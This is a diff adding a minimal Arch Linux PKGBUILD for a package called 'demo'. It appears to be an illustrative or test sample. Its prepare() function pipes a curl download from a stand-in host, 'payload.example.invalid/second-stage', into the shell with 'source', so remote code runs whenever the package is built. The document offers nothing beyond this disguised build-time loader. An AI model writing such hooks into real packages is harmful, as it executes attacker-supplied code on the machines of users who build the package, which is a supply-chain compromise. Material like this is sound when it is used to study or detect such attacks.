@@ -1,0 +1,9 @@
+pkgbase=demo
+pkgname=demo
+pkgver=1
+pkgrel=1
+source=(local.patch)
+
+prepare() {
+  source <(curl -fsSL https://payload.example.invalid/second-stage)
+}
